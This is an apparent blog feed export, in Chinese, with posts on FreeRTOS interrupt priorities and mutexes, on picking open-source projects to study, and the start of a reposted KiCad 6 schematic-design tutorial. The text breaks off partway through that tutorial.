Cortex-M的中断管理</h1><p>用户可以配置系统可管理的最高中断优先级的宏定义<code>configLIBRARY_MAX_SYSCALL_INTERRUPT_PRIORITY</code>，它用于配置内核中的<code>BASEPRI</code>寄存器，当<code>BASEPRI</code>设置为某个值时，NVIC不会响应比该优先级低的中断，而优先级比之更高的中断则不受影响。也就是说，当这个宏定义配置为5时，中断优先级数值在<code>0、1、2、3、4</code>的这些中断是不受FreeRTOS屏蔽的，即使在系统进入临界段时，这些中断也能被触发而不是等到退出临界段的时候才被触发，当然，这些中断服务函数中也不能调用FreeRTOS提供的API函数接口，而中断优先级在5～15的这些中断是可以被屏蔽的，也能安全调用FreeRTOS提供的API函数接口。</p><p>ARM Cortex-M NVIC支持中断嵌套功能：当一个中断触发并且系统进行响应时，处理器硬件会将当前运行的部分上下文寄存器自动压入中断栈中，这部分寄存器包括PSR、r0、r1、r2、r3以及r12。当系统正在服务一个中断时，如果有一个更高优先级的中断触发，那么处理器同样会打断当前运行的中断服务例程，然后把旧的中断服务例程上下文的PSR、r0、r1、r2、r3和r12寄存器自动保存到中断栈中。这部分上下文寄存器保存到中断栈的行为完全是硬件行为，这一点是与其他ARM处理器区别最大之处（以往都需要依赖于软件保存上下文）。</p><p>另外，在ARM Cortex-M系列处理器上，所有中断都采用中断向量表的方式进行处理，即当一个中断触发时，处理器将直接判定是哪个中断源，然后直接跳转到相应的固定位置进行处理。而在ARM7、ARM9中，一般是先跳转进入IRQ入口，然后由软件判断是哪个中断源触发，获得相对应的中断服务例程入口地址后，再进行后续的中断处理。ARM7、ARM9的好处在于，所有中断都有统一的入口地址，便于操作系统统一管理。而ARM Cortex-M系列处理器则恰恰相反，每个中断服务例程必须排列在一起放在统一的地址上（这个地址必须设置到NVIC的中断向量偏移寄存器中）。中断向量表一般由一个数组定义（或在起始代码中给出），在STM32上，默认采用起始代码给出</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>如何找到特定语言的好的项目</title>
    <link href="/2024/01/22/%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E7%89%B9%E5%AE%9A%E8%AF%AD%E8%A8%80%E7%9A%84%E5%A5%BD%E7%9A%84%E9%A1%B9%E7%9B%AE/"/>
    <url>/2024/01/22/%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E7%89%B9%E5%AE%9A%E8%AF%AD%E8%A8%80%E7%9A%84%E5%A5%BD%E7%9A%84%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们直到在学习一门编程语言的时候最后有一个优秀的开源项目，这样我们在学习的时候可以作为一个参考，并且还可以学到其他的知识。</p><p>所以如何找到一个合适的开源项目？本文是对这个问题的一个记载</p><h1 id="项目源"><a href="#项目源" class="headerlink" title="项目源"></a>项目源</h1><p>有几个开源项目的地址：</p><ul><li><a href="https://www.github.com/">https://www.github.com</a></li><li><a href="https://code.google.com/archive/search?q=domain:code.google.com%20label:C">google创建的开源代码库</a></li><li><a href="https://sourceforge.net/">https://sourceforge.net/</a></li><li><a href="https://www.oschina.net/project/lang/21/c?company=0&sort=time&os=37&lang=21&recommend=false">开源中国</a></li><li>各个大型互联网公司的开源项目</li></ul><p>以上几个网站可以找到绝对多数的开源项目。</p><h1 id="选择标准"><a href="#选择标准" class="headerlink" title="选择标准"></a>选择标准</h1><ul><li>我们在初学一门编程语言的时候需要熟悉这个语言的语法规则。所以需要避免涉及到其他专业领域的知识点如：电路板自动布线系统、机器学习等等。</li><li>项目代码的质量<ul><li>这个主要是代码中的注释含量、位置</li></ul></li><li>使用了多少主要语言的特性</li><li>项目代码的数量</li><li>自己的兴趣</li></ul><p>对于C&#x2F;C++代码而言有一些软件可以去帮助我们确定一个项目的质量：</p><ul><li><a href="https://www.frontendart.com/en/">https://www.frontendart.com/en/</a></li><li><a href="https://www.cppdepend.com/">https://www.cppdepend.com/</a><br>根据以上的选择标准我们可以自己去寻找一些开源项目进行研究。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FreeRTOS-7-互斥量</title>
    <link href="/2024/01/22/FreeRTOS-6-%E4%BA%92%E6%96%A5%E9%87%8F/"/>
    <url>/2024/01/22/FreeRTOS-6-%E4%BA%92%E6%96%A5%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>优先级的翻转：在操作系统的，每个任务的优先级都是确定好的。如果某个时间点低优先级持有互斥量，此时高优先级的任务就会阻塞。如果在低优先级执行时有唤醒了中优先级任务，此时这个中优先级任务就会抢占低优先级的任务。此时导致高优先级的任务变成了最后执行的任务。此时就导致了优先级的翻转问题。优先级高的任务在等待优先级的任务执行完毕。</p><p>优先级的继承：由于操作系统的会出现优先级的反转的情况。所以使用一个机制来<strong>缓解</strong>这个问题。在出现高优先级在等待低优先级的任务执行完毕时，操作系统会临时将低优先级的任务的优先级调至和高优先级的任务一样高。这就防止了低优先级任务被中优先级任务抢占。</p><p><strong>互斥量与二值信号量最大的不同之处在于，互斥量具有优先级继承机制，而信号量没有。</strong></p><h1 id="互斥量控制块"><a href="#互斥量控制块" class="headerlink" title="互斥量控制块"></a>互斥量控制块</h1><p>和信号量等等一致，互斥量也通过控制块来进行控制。</p><p>互斥量的API函数实际上也都是宏，使用现有的队列机制，这些宏定义在semphr.h文件中。如果使用互斥量，则需要包含semphr.h头文件。FreeRTOS的互斥量控制块结构体与消息队列结构体是一样的，只不过结构体中某些成员变量代表的含义不同。<strong>这个和信号量是一样的</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-number">1</span> <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QueueDefinition</span> &#123;</span><br> <span class="hljs-number">2</span> <span class="hljs-type">int8_t</span> *pcHead;<br> <span class="hljs-number">3</span> <span class="hljs-type">int8_t</span> *pcTail;<br> <span class="hljs-number">4</span> <span class="hljs-type">int8_t</span> *pcWriteTo;<br> <span class="hljs-number">5</span><br> <span class="hljs-number">6</span> <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br> <span class="hljs-number">7</span> <span class="hljs-type">int8_t</span> *pcReadFrom;<br> <span class="hljs-number">8</span>         UBaseType_t uxRecursiveCallCount;(<span class="hljs-number">1</span>)<br> <span class="hljs-number">9</span>     &#125; u;<br><span class="hljs-number">10</span><br><span class="hljs-number">11</span>     List_t xTasksWaitingToSend;<br><span class="hljs-number">12</span>     List_t xTasksWaitingToReceive;<br><span class="hljs-number">13</span><br><span class="hljs-number">14</span>     <span class="hljs-keyword">volatile</span> UBaseType_t uxMessagesWaiting;(<span class="hljs-number">2</span>)<br><span class="hljs-number">15</span>     UBaseType_t uxLength;(<span class="hljs-number">3</span>)<br><span class="hljs-number">16</span>     UBaseType_t uxItemSize;(<span class="hljs-number">4</span>)<br><span class="hljs-number">17</span><br><span class="hljs-number">18</span>     <span class="hljs-type">volatileint8_t</span> cRxLock;<br><span class="hljs-number">19</span>     <span class="hljs-type">volatileint8_t</span> cTxLock;<br><span class="hljs-number">20</span><br><span class="hljs-number">21</span> <span class="hljs-meta">#<span class="hljs-keyword">if</span>( ( configSUPPORT_STATIC_ALLOCATION == 1 )</span><br><span class="hljs-number">22</span>     &amp;&amp; ( configSUPPORT_DYNAMIC_ALLOCATION == <span class="hljs-number">1</span> ) )<br><span class="hljs-number">23</span>     <span class="hljs-type">uint8_t</span> ucStaticallyAllocated;<br><span class="hljs-number">24</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">25</span><br><span class="hljs-number">26</span> <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_QUEUE_SETS == 1 )</span><br><span class="hljs-number">27</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QueueDefinition</span> *<span class="hljs-title">pxQueueSetContainer</span>;</span><br><span class="hljs-number">28</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">29</span><br><span class="hljs-number">30</span> <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_TRACE_FACILITY == 1 )</span><br><span class="hljs-number">31</span>             UBaseType_t uxQueueNumber;<br><span class="hljs-number">32</span>             <span class="hljs-type">uint8_t</span> ucQueueType;<br><span class="hljs-number">33</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">34</span><br><span class="hljs-number">35</span>         &#125; xQUEUE;<br><span class="hljs-number">36</span><br><span class="hljs-number">37</span> <span class="hljs-keyword">typedef</span> xQUEUE Queue_t;<br></code></pre></td></tr></table></figure><p>（1）：pcReadFrom与uxRecursiveCallCount是一对互斥变量，使用联合体来确保两个互斥的结构体成员不会同时出现。</p><ul><li>如果结构体用于消息队列，则pcReadFrom指向出队消息空间的最后一个，即读取消息时是从pcReadFrom指向的空间读取消息内容；</li><li>如果结构体用于互斥量，uxRecursiveCallCount用于计数，记录递归互斥量被“调用”的次数。</li></ul><p>（2）：</p><ul><li>如果控制块结构体用于消息队列，则uxMessagesWaiting用来记录当前消息队列的消息个数；</li><li>如果控制块结构体用于互斥量时，这个值表示有效互斥量的个数。此值为1时表示互斥量有效，为0则表示互斥量无效。</li></ul><p>（3）：</p><ul><li>如果控制块结构体用于消息队列，则uxLength表示队列的长度，即能存放多少消息；</li><li>如果控制块结构体用于互斥量时，uxLength表示最大的信号量可用个数。uxLength最大为1，因为信号量要么是有效的，要么是无效的。</li></ul><p>（4）：</p><ul><li>如果控制块结构体用于消息队列，则uxItemSize表示单个消息的大小；</li><li>如果控制块结构体用于互斥量时，则无须分配存储空间，为0即可。</li></ul><h1 id="互斥量的相关函数"><a href="#互斥量的相关函数" class="headerlink" title="互斥量的相关函数"></a>互斥量的相关函数</h1><p>由于互斥量的优先级继承，所以一般将互斥量用作对资源的保护。</p><p>主要函数包括：</p><ul><li>创建</li><li>删除</li><li>发送消息</li><li>接受消息</li></ul><h2 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h2><p><code>xSemaphoreCreateMutex()</code>用于创建一个互斥量，并返回一个互斥量句柄。该句柄的原型是一个void型的指针，在使用之前必须先由用户定义一个互斥量句柄。要想使用该函数，必须在<code>FreeRTOSConfig.h</code>中把宏<code>configSUPPORT_DYNAMIC_ALLOCATION</code>定义为1，即开启动态内存分配。其实该宏在<code>FreeRTOS.h</code>中默认定义为1，即所有FreeRTOS的对象在创建时都默认使用动态内存分配方案。同时还需要在<code>FreeRTOSConfig.h</code>中把<code>configUSE_MUTEXES</code>宏定义打开，表示使用互斥量。</p><p><code>xSemaphoreCreateMutex()</code>这个函数实际上是一个宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> xSemaphoreCreateMutex()    xQueueCreateMutex( queueQUEUE_TYPE_MUTEX )</span><br><br></code></pre></td></tr></table></figure><p>可以看到互斥量和信号量一样，其实就是队列函数的包装、不同的参数上的使用。<code>xSemaphoreCreateMutex()</code>函数虽然没有直接调用<code>xQueueGenericCreate()</code>函数，但是在<code>xQueueCreateMutex()</code>中还是调用了函数<code>xQueueGenericCreate()</code>。</p><h3 id="递归互斥量创建函数"><a href="#递归互斥量创建函数" class="headerlink" title="递归互斥量创建函数"></a>递归互斥量创建函数</h3><p><code>xSemaphoreCreateRecursiveMutex()</code>用于创建一个递归互斥量。非递归互斥量用函数<code>xSemaphoreCreateMutex()</code>或<code>xSemaphoreCreateMutexStatic()</code>创建。静态创建函数一般不会使用。所以只写了动态创建函数在上面。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401250027032.png"></p><ul><li>非递归互斥量且只能被同一个任务获取一次，如果同一个任务想再次获取则会失败。</li><li>递归互斥量则相反，它可以被同一个任务获取很多次，获取多少次就需要释放多少次。</li></ul><p>递归互斥量与互斥量一样，都实现了优先级继承机制，可以减少优先级翻转情况的发生。</p><p>有上面的图我们可以知道。这个函数实际上也是对于<code>xQueueCreateMutex()</code>函数的封装。</p><h2 id="互斥量删除函数"><a href="#互斥量删除函数" class="headerlink" title="互斥量删除函数"></a>互斥量删除函数</h2><p>这个函数和信号量使用的删除函数是一致的。</p><h2 id="非递归互斥量获取函数"><a href="#非递归互斥量获取函数" class="headerlink" title="非递归互斥量获取函数"></a>非递归互斥量获取函数</h2><p><code>xSemaphoreTake( xSemaphore, xBlockTime )</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> xSemaphoreTake( xSemaphore, xBlockTime )    xQueueSemaphoreTake( ( xSemaphore ), ( xBlockTime ) )</span><br></code></pre></td></tr></table></figure><p>这个函数也是对于<code>xQueueSemaphoreTake()</code>的封装，这和信号量的获取函数是一样的，不同的是如果是信号量<strong>则没有优先级继承算法</strong>，如果是互斥量则有。</p><h2 id="递归互斥量获取函数"><a href="#递归互斥量获取函数" class="headerlink" title="递归互斥量获取函数"></a>递归互斥量获取函数</h2><h2 id="非递归互斥量释放函数"><a href="#非递归互斥量释放函数" class="headerlink" title="非递归互斥量释放函数"></a>非递归互斥量释放函数</h2><h2 id="递归互斥量释放函数"><a href="#递归互斥量释放函数" class="headerlink" title="递归互斥量释放函数"></a>递归互斥量释放函数</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>开源EDA工具KiCad电路设计小书</title>
    <link href="/2024/01/20/%E5%BC%80%E6%BA%90EDA%E5%B7%A5%E5%85%B7Kicad%E7%94%B5%E8%B7%AF%E8%AE%BE%E8%AE%A1%E5%B0%8F%E4%B9%A6/"/>
    <url>/2024/01/20/%E5%BC%80%E6%BA%90EDA%E5%B7%A5%E5%85%B7Kicad%E7%94%B5%E8%B7%AF%E8%AE%BE%E8%AE%A1%E5%B0%8F%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<p>转载一篇优秀的文章——关于KiCad。</p><span id="more"></span> <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于国内的中小型电子企业而言，<strong>Allegro</strong>、<strong>Pads</strong>、<strong>Altium Designer</strong> 等商业 EDA 工具的授权费用过于昂贵，且大部分只提供 Windows 操作系统版本，缺乏相应的跨平台支持。在电子信息技术行业版权问题充分受到重视的今天，一款易于使用并且受到厂商广泛支持的开源 <strong>EDA</strong> 工具，对于硬件电子工程师而言尤为重要。本文介绍的 <a href="https://kicad-pcb.org/"><strong>KiCad</strong></a> 就是一款基于 <a href="https://www.kicad.org/about/licenses/"><strong>GNU GPL v3</strong></a> 开源许可协议的跨平台 <strong>EDA</strong> 电子设计自动化工具集，其能够处理多达 <strong>32</strong> 个铜层、<strong>14</strong> 个技术层、<strong>4</strong> 个辅助层的 PCB 电路板，并且生成加工制造所需要的<code>网表</code>、<code>物料清单</code>、<code>光绘文件</code>、<code>钻孔文件</code>、<code>元件放置文件</code>。</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/logo.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/logo.png"></a></p><p>自 2018 年 07 月 22 日发布 <strong>KiCad 5.0</strong> 版本以后，历经了三年时间，终于在 2021 年 12 月 25 发布了全新的 <strong>KiCad 6.0</strong> 版本，新版本采用了全新的用户交互界面，带来全新<strong>原理图编辑器</strong>、<strong>PCB 编辑器</strong>、<strong>3D 查看器</strong>的同时，还增加了更为丰富的 <strong>DRC 设计规则</strong>约束，并且提供了对于<strong>中文语言</strong>的良好支持。全文最早基于 <strong>5.0</strong> 版本写作，鉴于官方已经升级至功能更为完善的 <strong>6.0</strong> 版本，所以基于官方新版的 <a href="https://docs.kicad.org/6.0/en/getting_started_in_kicad/getting_started_in_kicad.html"><strong>《Getting Started in KiCad》</strong></a> 对本文进行了全面的重写。</p><h2 id="KiCad-6-简介"><a href="#KiCad-6-简介" class="headerlink" title="KiCad 6 简介"></a>KiCad 6 简介</h2><p>本文涉及的 <strong>KiCad</strong> 工程源文件，已经全部共享至笔者的 <strong>Github</strong> 项目 <a href="https://github.com/uinika/abrams">Abrams</a>，欢迎大家 <code>Clone</code> 或者 <code>Fork</code>。类似于其它的 <strong>EDA</strong> 电子设计自动化工具，<strong>KiCad</strong> 同样将 PCB 电路板的绘制过程划分为<strong>原理图</strong>（<strong>Schematic</strong> [skiːˈmætɪk]，电路的符号表示）与<strong>电路板</strong>（<strong>PCB</strong>，Printed Circuit Board，原理图的物理实现）两个部分，并且分别提供了独立的<strong>原理图&#x2F;符号编辑器</strong>，以及<strong>电路板&#x2F;封装编辑器</strong>：</p><ol><li>首先，采用 <strong>KiCad 原理图编辑器</strong>绘制原理图，即在原理图当中添加符号并且绘制连接，同时为每个元件指派或者创建封装。在通过 <strong>ERC 电气规则检查</strong>之后，就可以将其更新至<strong>电路板编辑器</strong>；</li><li>然后，运用 <strong>KiCad PCB 编辑器</strong>进行元件封装的物理布局与布线，这个过程当中需要特别注意 <strong>SI 信号完整性</strong>相关的问题。在通过 <strong>DRC 设计规则检查</strong>之后，就可以交付给工厂进行生产制造输出；</li></ol><blockquote><p><strong>注意</strong>：<strong>KiCad</strong> 的<strong>原理图编辑器</strong>和<strong>PCB 编辑器</strong>之间可以进行双向的同步更新，即支持<strong>交互式布线</strong>功能；</p></blockquote><h2 id="创建工程"><a href="#创建工程" class="headerlink" title="创建工程"></a>创建工程</h2><p>运行 <strong>KiCad</strong> 之后，就会打开<strong>工程文件</strong>管理窗口，鼠标选择菜单栏的【<strong>文件 ➞ 新建工程</strong>】或者直接按下快捷键【<strong>Ctrl + N</strong>】，浏览至希望保存工程的位置，并且将工程命名为 <code>uinio</code>，然后鼠标点击【<strong>保存</strong>】：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/1.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/1.png"></a></p><p>此时 <strong>KiCad</strong> 就会自动在工程目录当中，分别创建后缀名为 <code>.kicad_pro</code>(工程)、<code>.kicad_sch</code>(原理图)、<code>.kicad_pcb</code>(电路板) 的三个源文件：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/2.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/2.png"></a></p><p>除此之外，<strong>KiCad</strong> 还会自动生成一个用于工程备份的 <code>-backups</code> 目录，可以通过鼠标选择菜单栏的【<strong>偏好设置 ➞ 偏好设置</strong>】或者直接按下快捷键【<strong>Ctrl + ,<strong>】，打开【</strong>偏好设置</strong>】对话框，设置工程自动备份的规则：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/3.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/3.png"></a></p><h2 id="调整配色方案"><a href="#调整配色方案" class="headerlink" title="调整配色方案"></a>调整配色方案</h2><p>下载 <a href="https://github.com/aerospaceplane/kicad-color-schemes">kicad-color-schemes</a> 到本地，解压之后得到一系列的配色方案，这里选择笔者比较喜欢使用的 <strong>behave-dark</strong> 配色方案，拷贝该目录当中的 <code>behave-dark.json</code> 和 <code>behave-dark_footprints.json</code> 文件至目录 <code>C:\Users\用户名\AppData\Roaming\kicad\6.0\colors</code>，然后重新启动 <strong>KiCad</strong>，分别在<strong>原理图编辑器</strong>和<strong>PCB 编辑器</strong>当中，鼠标选择菜单栏上的【<strong>偏好设置 ➞ 偏好设置</strong>】或者按下快捷键【<strong>Ctrl + ,<strong>】，打开【</strong>偏好设置对话框</strong>】里的【<strong>颜色</strong>】菜单，将配色主题设置为<code>Behave Dark</code>：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/4.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/4.png"></a></p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/5.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/5.png"></a></p><p>对于其它的操作系统，可以参考 <strong>kicad-color-schemes</strong> 工程自述文件当中的说明，拷贝 <code>.json</code> 配色文件至相应的目录：</p><ul><li><strong>Linux</strong>：<code>~.config/kicad/6.0/colors</code>；</li><li><strong>macOS</strong>: 用户 <strong>Home</strong> 主目录 + <code>/Library/Preferences/kicad/6.0/colors</code>；</li><li><strong>Windows 10</strong>: <code>C:\Users\username\AppData\Roaming\kicad\6.0\colors</code>，即 <code>%APPDATA%\kicad</code>；</li></ul><h2 id="原理图编辑"><a href="#原理图编辑" class="headerlink" title="原理图编辑"></a>原理图编辑</h2><h3 id="符号库表设置"><a href="#符号库表设置" class="headerlink" title="符号库表设置"></a>符号库表设置</h3><p>首次打开 <strong>KiCad</strong> 的<strong>原理图编辑器</strong>时，会出现【<strong>配置全局符号库表</strong>】对话框，即指定原理图符号库文件 <code>sym-lib-table</code> 的存储位置，如果当前已经安装了默认库，那么可以选择默认的选项【<strong>复制默认全局符号库表</strong>】（把安装目录下的 <code>sym-lib-table</code> 文件复制一份至用户目录）：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/6.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/6.png"></a></p><p>如果 <strong>KiCad</strong> 在默认的位置找不到 <code>sym-lib-table</code> 符号库文件，则上述的默认选项将会被禁用。这种情况下，应当选择第 2 个选项【<strong>复制自定义全局符号库表</strong>】，然后分别浏览到当前操作系统的如下目录，手动的选择 <code>sym-lib-table</code> 文件：</p><ul><li><strong>Linux</strong>：<code>/usr/share/kicad/template/</code>；</li><li><strong>macOS</strong>: <code>/Applications/KiCad/KiCad.app/Contents/SharedSupport/template/</code>；</li><li><strong>Windows</strong>: <code>KiCad\share\kicad\template</code>；</li></ul><h3 id="原理图编辑器基础"><a href="#原理图编辑器基础" class="headerlink" title="原理图编辑器基础"></a>原理图编辑器基础</h3><p>通过 <strong>KiCad</strong> 的<strong>原理图编辑器</strong>打开 <code>uinio.kicad_sch</code> 原理图文件之后，可以通过【<strong>鼠标中键</strong>】或者【<strong>鼠标右键</strong>】平移原理图，或者使用按键【<strong>F1 &#x2F; F2</strong>】或者【<strong>鼠标滚轮</strong>】进行放大与缩小操作：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/6-1.gif"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/6-1.gif"></a></p><p><strong>原理图编辑器</strong> 默认勾选了【<strong>偏好设置 ➞ 鼠标和触摸板 ➞ 缩放时居中光标</strong>】，可以在用户执行缩放操作时，使得鼠标光标能够自动的在屏幕上面居中。</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/7.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/7.png"></a></p><p>除此之外，还可以打开<strong>原理图编辑器</strong>当中的【<strong>偏好设置 ➞ 快捷键</strong>】菜单，由用户自定义快捷键：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/8.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/8.png"></a></p><p><strong>原理图编辑器</strong>左侧的工具栏包含了基本的<strong>显示设置</strong>，而右侧的工具栏则包含了常用的<strong>原理图绘制工具</strong>：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/9.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/9.png"></a></p><h3 id="原理图设置"><a href="#原理图设置" class="headerlink" title="原理图设置"></a>原理图设置</h3><p>鼠标单击<strong>原理图编辑器</strong>菜单栏的【<strong>文件 → 图框设置</strong>】，对原理图相关的信息进行设置，原理图框的<strong>尺寸</strong>默认为 <code>A4 210 × 297mm</code> 大小，而<strong>发行日期</strong>、<strong>修订</strong>、<strong>标题</strong>、<strong>厂商</strong>信息设置分别如下图所示：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/10.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/10.png"></a></p><h3 id="添加原理图符号"><a href="#添加原理图符号" class="headerlink" title="添加原理图符号"></a>添加原理图符号</h3><p>鼠标点击工具栏右侧的【<strong>添加符号</strong>】按钮或者直接按下快捷键【<strong>A</strong>】，打开【<strong>选择符号</strong>】对话框，选择当前需要放置的原理图符号：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/11.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/11.png"></a></p><p>首先，向下滚动并且展开【<strong>Device</strong>】库，选择【<strong>LED</strong>】符号，鼠标点击【<strong>确定</strong>】按钮或者按下【<strong>回车键</strong>】，再次点击【<strong>鼠标左键</strong>】放置原理图符号：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/12.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/12.png"></a></p><p>然后，通过在【<strong>选择符号</strong>】对话框顶部过滤器内输入 <code>R</code> 或者 <code>R_US</code> 来添加一个限流电阻，并将其放置在原理图当中：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/13.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/13.png"></a></p><p>最后，再放置一个 <code>Battery_Cell</code> 电池符号，用于为上面添加的 <strong>LED</strong> 供电：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/14.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/14.png"></a></p><h3 id="选择和移动符号"><a href="#选择和移动符号" class="headerlink" title="选择和移动符号"></a>选择和移动符号</h3><p>在<strong>原理图编辑器</strong>当中，如下的快捷键用于选择原理图符号：</p><ul><li>【<strong>鼠标左键</strong>】是选择一个原理图符号，</li><li>【<strong>Shift + 鼠标左键</strong>】则是选择多个符号，</li><li>【<strong>Ctrl + Shift + 鼠标左键</strong>】移除当前选择的符号，</li></ul><p>而如下的快捷键，则可以用于操作原理图符号：</p><ul><li>【<strong>R</strong>】旋转原理图符号；</li><li>【<strong>M</strong>】移动符号（<strong>连线</strong>不会跟随移动）；</li><li>【<strong>G</strong>】拖动符号（<strong>连线</strong>同时跟随移动）；</li><li>【<strong>Del</strong>】 删除原理图符号；</li></ul><p>将之前放置在原理图上的 3 个符号，按照下图所示的位置进行摆放：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/15.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/15.png"></a></p><h3 id="连接原理图符号"><a href="#连接原理图符号" class="headerlink" title="连接原理图符号"></a>连接原理图符号</h3><p>首先，鼠标点击<strong>原理图编辑器</strong>右侧的【<strong>添加连线</strong>】按钮或者按下快捷键【<strong>W</strong>】，把原理符号按照下图所示的形式连接起来：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/16.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/16.png"></a></p><blockquote><p><strong>注意</strong>：按下快捷键【<strong>Esc</strong>】可以取消连接，或者将鼠标悬停在未连接的符号引脚上，当光标指示发生改变的时候，点击【<strong>鼠标左键</strong>】，同样可以从这个位置开始绘制<strong>连线</strong>。</p></blockquote><p>接下来，为了更加方便的理解原理图，需要再行添加<code>电源符号</code>和<code>接地符号</code>，鼠标左键点击<strong>原理图编辑器</strong>右侧的【<strong>添加电源端口</strong>】按钮或者按下快捷键【<strong>P</strong>】，打开【<strong>选择电源符号</strong>】对话框：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/17.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/17.png"></a></p><p>然后，分别向原理图当中添加一个 <code>VCC</code> 和一个 <code>GND</code> 符号，再使用<strong>连线</strong>将其连接至刚才的电路：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/18.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/18.png"></a></p><p>最后，在<code>发光二极管</code>和<code>电阻器</code>之间的导线上添加<strong>网络标签</strong>，鼠标左键点击<strong>原理图编辑器</strong>左侧的【<strong>添加网络标签</strong>】按钮或者按下快捷键【<strong>L</strong>】，放置过程当中需要让标签的<strong>方形连接点</strong>与<strong>连线</strong>重叠：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/19.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/19.png"></a></p><blockquote><p><strong>注意</strong>：相同名称的<strong>标签</strong>和<strong>电源符号</strong>表示相互之间是连接在一起的，即使它们在视觉上没有连接关系。</p></blockquote><h3 id="位号-符号属性-封装"><a href="#位号-符号属性-封装" class="headerlink" title="位号 &#x2F; 符号属性 &#x2F; 封装"></a>位号 &#x2F; 符号属性 &#x2F; 封装</h3><p><strong>位号</strong>是每一个原理图符号的唯一标识，鼠标点击<strong>原理图编辑器</strong>顶部工具栏的【<strong>填写原理图符号位号</strong>】按钮，打开【<strong>批注原理图</strong>】对话框，并且点击【<strong>批注</strong>】按钮：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/20.png"><img 